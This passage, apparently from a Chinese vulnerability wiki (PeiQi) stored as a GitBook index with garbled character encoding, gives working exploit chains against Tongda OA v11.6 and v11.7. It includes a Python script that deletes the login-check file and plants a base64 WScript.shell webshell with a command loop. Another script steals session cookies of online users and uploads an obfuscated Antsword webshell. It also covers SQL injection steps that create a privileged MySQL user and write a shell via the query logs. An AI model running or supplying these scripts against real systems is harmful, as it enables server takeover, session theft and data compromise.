å¹¶æœªè¿›è¡Œæ ¡éªŒ å°±æ‰§è¡Œunlinkåˆ é™¤æ–‡ä»¶ å¯ä»¥æœ¬åœ°åœ¨ \\webroot\\inc ç›®å½•åˆ›å»º 1.txt æ–‡ä»¶ ç„¶åè®¿é—® http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt å°±ä¼šåˆ é™¤è¿™ä¸ª 1.txt æ–‡ä»¶ï¼Œä¹Ÿä»£è¡¨å¯ä»¥åˆ é™¤ auth.inc.php ç™»å½•æ£€éªŒæ–‡ä»¶ å›åˆ° upload.php æ–‡ä»¶è¿›è¡Œä»£ç å®¡è®¡ åˆ¤æ–­å˜é‡ $action æ˜¯å¦ä¸º uploadï¼Œå†åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå¦‚æœä¸ä¸º xls å’Œ img åˆ™è¿›å…¥elseåˆ†æ”¯ else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/attachment\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/attachment\"); } if (isset($from_rep)) { if (($from_rep != \"\") && ($from_rep[0] == \"{\")) { $repkid = GetRepKIDBySendId($from_rep); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); } } } else { $arr = explode(\",\", $from_rep); for ($i = 0; $i åœ¨è¿™æ®µä»£ç ä¸­ï¼Œå¦‚æœä¸å­˜åœ¨ $from_rep å˜é‡åˆ™ä¼šè·³åˆ°å¦‚ä¸‹ä»£ç  else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } è¿™é‡Œç›´æ¥å°† $repkid å˜é‡è¿›è¡Œæ‹¼æ¥,ä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡ç›®å½•ç©¿è¶Šæ¥ä¸Šä¼ æ¶æ„æ–‡ä»¶åˆ°æŒ‡å®šç›®å½• [!NOTE] è¿™é‡Œéœ€è¦åˆ©ç”¨file_existså‡½æ•°çš„æ¼æ´æ„é€ /.<>./.<>./.<>./ é€ƒé€¸å‡ºæ¥ ä½¿ç”¨POCæ¥åˆ©ç”¨æ¼æ´ [!NOTE] æ³¨æ„åœ¨åˆ é™¤éªŒè¯èº«ä»½çš„æ–‡ä»¶åï¼Œä¼šé€ æˆåå°é¡µé¢å‡ºç°å¦‚ä¸‹å›¾ï¼Œä½¿ç”¨å‰å¤‡ä»½æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/module/appbuilder/assets/print.php\" try: check_url_response = requests.get(url = check_url) if check_url_response.status_code == 200: print(\"\\033[32m[o] å­˜åœ¨ /module/appbuilder/assets/print.php å¯èƒ½å«æœ‰é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCEæ¼æ´\\033[0m\") input(\"\\033[32m[o] æ­¤æ¼æ´ä¼šå¯¹çœŸå®ç¯å¢ƒé€ æˆå½±å“ï¼Œè¯·åœ¨æˆæƒçš„æƒ…å†µä¸‹åˆ©ç”¨æ­¤æ¼æ´ï¼ŒæŒ‰ä¸‹ä»»æ„é”®ç»§ç»­..... \\033[0m\") else: print(\"\\033[31m[x] ä¸å­˜åœ¨ /module/appbuilder/assets/print.php æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œ{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url): unlink_url = target_url + \"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" try: unlink_response = requests.get(url = unlink_url) if unlink_response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸåˆ é™¤æ ¡éªŒæ–‡ä»¶ auth.inc.php \\033[0m\") else: print(\"\\033[31m[x] åˆ é™¤æ ¡éªŒæ–‡ä»¶ auth.inc.php å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œ{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, payload_php): \"\"\" (ç»•è¿‡çš„webshell) exec(\"cmd /c \".$command); $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> \"\"\" vuln_url = target_url + \"/general/data_center/utils/upload.php?action=upload&filetype=test&repkid=/.<>./.<>./.<>./\" files = {'FILE1': ('test.php', payload_php)} try: vuln_response = requests.post(url = vuln_url,files=files) if vuln_response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸå†™å…¥webshellæ–‡ä»¶: _test.php \\033[0m\") print(\"\\033[32m[o] webshellåœ°å€ä¸º: {}/_test.php \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] å†™å…¥webshellæ–‡ä»¶å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œ{} \\033[0m\".format(e)) sys.exit(0) def POC_4(target_url, cmd): cmd_url = target_url + \"/_test.php?test={}\".format(cmd) try: cmd_response = requests.get(url = cmd_url) if cmd_response.status_code == 200: print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡Œå‘½ä»¤: {} \\033[0m\".format(cmd_url)) print(\"\\033[32m[o] å“åº”ä¸º: \\n{} \\033[0m\".format(cmd_response.text)) else: print(\"\\033[31m[x] å‘½ä»¤æ‰§è¡Œå¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œ{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) POC_2(target_url) payload_php = base64.b64decode(\"PD9waHAKICAgICRjb21tYW5kPSRfR0VUWyd0ZXN0J107CiAgICAkd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwogICAgJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiAgICAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwogICAgJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKICAgIGVjaG8gJHN0cm91dHB1dDsKPz4=\").decode(\"utf-8\") POC_3(target_url, payload_php) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_4(target_url, cmd) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 17:22:07 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.7 åå°SQLæ³¨å…¥.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.7 åå°SQLæ³¨å…¥.html","title":"é€šè¾¾OA v11.7 åå°SQLæ³¨å…¥","keywords":"","body":"é€šè¾¾OA v11.7åå°SQLæ³¨å…¥ æ¼æ´æè¿° é€šè¾¾OA v11.7åå°å­˜åœ¨SQLæ³¨å…¥ï¼Œå¯é€šè¿‡æ­¤æ¼æ´å†™å…¥æ¶æ„åé—¨æ–‡ä»¶æ”»å‡»ç›®æ ‡æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] é€šè¾¾OA v11.7 ç¯å¢ƒæ­å»º ç¯å¢ƒåœ°å€ æ¼æ´å¤ç° åœ¨ general/hr/manage/query/delete_cascade.php æ–‡ä»¶ä¸­ é¦–å…ˆåˆ¤æ–­$condition_cascadeæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œåˆ™å°†å…¶ä¸­çš„\\'æ›¿æ¢ä¸º'ã€‚ä¸ºä»€ä¹ˆè¦è¿™æ ·æ›¿æ¢å‘¢ï¼Œä¸»è¦æ˜¯å› ä¸ºV11.7ç‰ˆæœ¬ä¸­ï¼Œæ³¨å†Œå˜é‡æ—¶è€ƒè™‘äº†å®‰å…¨é—®é¢˜ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ç”¨addslasheså‡½æ•°è¿›è¡Œä¿æŠ¤ï¼Œå¦‚ä¸‹ï¼š inc/common.inc.php ä»£ç  ä½¿ç”¨ç›²æ³¨å¯¹SQLæ³¨å…¥è¿›è¡Œæµ‹è¯• è§¦å‘äº†é€šè¾¾OAçš„SQLæ³¨å…¥æ‹¦æˆª inc/conn.phpæ–‡ä»¶ä¸­æ‰¾åˆ°è¿‡æ»¤æœºåˆ¶å¦‚ä¸‹: å…¶è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œä½†æ˜¯å¹¶éæ— æ³•ç»•è¿‡ï¼Œç›²æ³¨çš„æ ¸å¿ƒæ˜¯ï¼šsubstrã€ifç­‰å‡½æ•°ï¼Œå‡æœªè¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆåªè¦æ„é€ MySQLæŠ¥é”™å³å¯é…åˆifå‡½æ•°è¿›è¡Œç›²æ³¨äº†ï¼Œç¿»çœ‹å±€å¤–äººå¸ˆå‚…åœ¨è¡¥å¤©ç™½å¸½å¤§ä¼šä¸Šçš„åˆ†äº«ï¼Œå‘ç°power(9999,99)ä¹Ÿå¯ä»¥ä½¿æ•°æ®åº“æŠ¥é”™ï¼Œæ‰€ä»¥æ„é€ è¯­å¥ï¼š select if((substr(user(),1,1)='r'),1,power(9999,99)) # å½“å­—ç¬¦ç›¸ç­‰æ—¶ï¼Œä¸æŠ¥é”™ï¼Œé”™è¯¯æ—¶æŠ¥é”™ æ·»åŠ SQLæ•°æ®åº“ç”¨æˆ· grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION è®¿é—® http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION è¿›å…¥ Myoa/mysql5/bin ç›®å½• æ‰§è¡Œ mysql -upeiqi -p è¾“å…¥å¯†ç æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ· å‘ç°æˆåŠŸæ‰§è¡Œæ·»åŠ ä¸€ä¸ªè´¦æˆ· ç„¶åè¯¥ç”¨æˆ·æ˜¯å¯¹mysqlæ•°æ®åº“æ‹¥æœ‰æ‰€æœ‰æƒé™çš„,ç„¶åç»™è‡ªå·±åŠ æƒé™ï¼š UPDATE `mysql`.`user` SET `Password` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('peiqi' AS Binary(5)); ç„¶åç”¨æ³¨å…¥ç‚¹åˆ·æ–°æƒé™ï¼Œå› ä¸ºè¯¥ç”¨æˆ·æ˜¯æ²¡æœ‰åˆ·æ–°æƒé™çš„æƒé™çš„ï¼šgeneral/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;è¿™æ ·å°±æ‹¥æœ‰äº†æ‰€æœ‰æƒé™ ç™»å½•å¦‚æœå¤±è´¥ï¼Œæ‰§è¡Œ grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION åˆ©ç”¨æ¼æ´å†™shell # æŸ¥è·¯å¾„ï¼š select @@basedir; # F:\\OA\\mysql5\\ï¼Œé‚£ä¹ˆwebç›®å½•å°±æ˜¯ F:/OA/webroot/ # æ–¹æ³•1ï¼š set global slow_query_log=on; set global slow_query_log_file='F:/OA/webroot/'; select '' or sleep(11); # æ–¹æ³•2ï¼š set global general_log = on; set global general_log_file = 'F:/OA/webroot/'; select ''; show variables like '%general%'; ä¸Šä¼ å¤§é©¬ å‚è€ƒæ–‡ç«  é€šè¾¾OA v11.7åå°SQLæ³¨å…¥åˆ°RCE[0day] PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.7 åœ¨çº¿ç”¨æˆ·ç™»å½•æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.7 åœ¨çº¿ç”¨æˆ·ç™»å½•æ¼æ´.html","title":"é€šè¾¾OA v11.7 åœ¨çº¿ç”¨æˆ·ç™»å½•æ¼æ´","keywords":"","body":"é€šè¾¾OA v11.7 åœ¨çº¿ç”¨æˆ·ç™»å½•æ¼æ´ æ¼æ´æè¿° é€šè¾¾OA v11.7 ä¸­å­˜åœ¨æŸæ¥å£æŸ¥è¯¢åœ¨çº¿ç”¨æˆ·ï¼Œå½“ç”¨æˆ·åœ¨çº¿æ—¶ä¼šè¿”å› PHPSESSIONä½¿å…¶å¯ç™»å½•åå°ç³»ç»Ÿ æ¼æ´å½±å“ [!NOTE] é€šè¾¾OA ç¯å¢ƒæ­å»º é€šè¾¾OA v11.7ä¸‹è½½é“¾æ¥ ä¸‹è½½åæŒ‰æ­¥éª¤å®‰è£…å³å¯ æ¼æ´å¤ç° æ¼æ´æœ‰å…³æ–‡ä»¶ MYOA\\webroot\\mobile\\auth_mobi.php åœ¨æ‰§è¡Œçš„ SQLè¯­å¥ä¸­ $sql = 'SELECT SID FROM user_online WHERE UID = \\'' . $uid . '\\' and CLIENT = \\'' . $P_VER . '\\''; ç®€å•é˜…è¯»PHPæºç å¯ä»¥çŸ¥é“ æ­¤SQLè¯­å¥ä¼šæŸ¥è¯¢ç”¨æˆ·æ˜¯å¦åœ¨çº¿ï¼Œå¦‚åœ¨çº¿è¿”å›æ­¤ç”¨æˆ· Session ID å°†è¿”å›çš„ Set-Cookie ä¸­çš„Cookieå‚æ•°å€¼ä½¿ç”¨äºç™»å½•Cookie è®¿é—®ç›®æ ‡åå° http://xxx.xxx.xxx.xxx/general/ å½“ç›®æ ‡ç¦»çº¿æ—¶åˆ™è®¿é—®æ¼æ´é¡µé¢åˆ™ä¼šå‡ºç°å¦‚ä¸‹å›¾ [!NOTE] é€šè¿‡æ­¤æ€è·¯å¯ä»¥æŒç»­å‘åŒ…ç›‘æ§æ­¤é¡µé¢æ¥è·å–åœ¨çº¿ç”¨æˆ·çš„Cookie æ¼æ´åˆ©ç”¨POC [!NOTE] 5ç§’ä¸€æ¬¡æµ‹è¯•ç”¨æˆ·æ˜¯å¦åœ¨çº¿ import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: é€šè¾¾OA 11.7 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"RELOGIN\" in response.text and response.status_code == 200: print(\"\\033[31m[x] ç›®æ ‡ç”¨æˆ·ä¸ºä¸‹çº¿çŠ¶æ€ --- {}\\033[0m\".format(time.asctime( time.localtime(time.time())))) elif response.status_code == 200 and response.text == \"\": PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers)) print(\"\\033[32m[o] ç”¨æˆ·ä¸Šçº¿ PHPSESSION: {} --- {}\\033[0m\".format(PHPSESSION[0] ,time.asctime(time.localtime(time.time())))) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œç›®æ ‡å¯èƒ½ä¸å­˜åœ¨æ¼æ´\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) while True: POC_1(target_url) time.sleep(5) [!NOTE] äº 2021-3-11 æ·»åŠ è¿›ä¸€æ­¥åˆ©ç”¨POC é…åˆ import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: é€šè¾¾OA 11.7 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_0(target_url): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"RELOGIN\" in response.text and response.status_code == 200: print(\"\\033[31m[x] ç›®æ ‡ç”¨æˆ·ä¸ºä¸‹çº¿çŠ¶æ€ --- {}\\033[0m\".format(time.asctime( time.localtime(time.time())))) elif response.status_code == 200 and response.text == \"\": Cookie = re.findall(r'PHPSESSID=(.*?);', str(response.headers)) print(\"\\033[32m[o] ç”¨æˆ·ä¸Šçº¿ PHPSESSION: {} --- {}\\033[0m\".format(Cookie[0] ,time.asctime(time.localtime(time.time())))) Cookie = \"PHPSESSID={};USER_NAME_COOKIE=admin; OA_USER_ID=admin\".format(Cookie[0]) POC_1(target_url, Cookie) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œç›®æ ‡å¯èƒ½ä¸å­˜åœ¨æ¼æ´\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5pbmkiCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKYXV0b19wcmVwZW5kX2ZpbGU9dGVzdC5sb2cKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"æ¡£æ¡ˆå·²ä¿å­˜\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼ .user.iniæ–‡ä»¶, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸Šä¼ .user.iniæ–‡ä»¶å¤±è´¥\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5sb2ciCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKPD9waHAgCmVjaG8gInRlc3RfV2lraSI7CiRwemtCPWNyZWF0ZV9mdW5jdGlvbihjaHIoMDEwMTc1MC8wMTY1MikuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoOTkwODEvOTA5KS5jaHIoMDEwMjUtMDY2MCksY2hyKDA1MTctMDM1MikuY2hyKDB4MzQzLTB4MmNkKS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuYmFzZTY0X2RlY29kZSgnS0E9PScpLmJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoNDQ0LTMyOSkuYmFzZTY0X2RlY29kZSgnYnc9PScpLmNocig1OTctNDg4KS5jaHIoMHgxOWYtMHgxM2EpLmNocigyMTktMTc4KS5iYXNlNjRfZGVjb2RlKCdPdz09JykpOyRwemtCKGJhc2U2NF9kZWNvZGUoJ05EZzFOJy4nemMyTzAnLidCbGRrRicuJ3NLQ1JmJy4nJy5jaHIoODIxMTAvOTY2KS5iYXNlNjRfZGVjb2RlKCdSUT09Jykuc3RyX3JvdDEzKCc5JykuY2hyKDAxNTUwNjQvMDEyMzEpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5zdHJfcm90MTMoJ1MnKS5iYXNlNjRfZGVjb2RlKCdkQT09JykuYmFzZTY0X2RlY29kZSgnTUE9PScpLmNocig2MDc1MC82NzUpLmNocigwMTUwNy0wMTM1NykuJycuJ04wWFNrJy4nN01UUTEnLidOek15TycuJ0RzPScuJycpKTs/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQo=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \\033[0m\".format(target_url)) if \"æ¡£æ¡ˆå·²ä¿å­˜\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼  test.log æ–‡ä»¶, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸Šä¼  test.log æ–‡ä»¶å¤±è´¥\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"test_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­åŒ…å« test_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] æˆåŠŸä¸Šä¼ èšå‰‘æœ¨é©¬ å¯†ç ä¸º: test \\n[o] webshellè·¯å¾„: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) sys.exit(0) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­ä¸åŒ…å« test_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) while True: POC_0(target_url) time.sleep(5) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 16:24:23 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«XSSæ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«XSSæ¼æ´.html","title":"é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«XSSæ¼æ´","keywords":"","body":"é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«å­˜å‚¨å‹XSSæ¼æ´ æ¼æ´æè¿° é€šè¾¾OA v11.8ä»¥ä¸‹å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¥å£ï¼Œå¯ä¸Šä¼  .user.ini 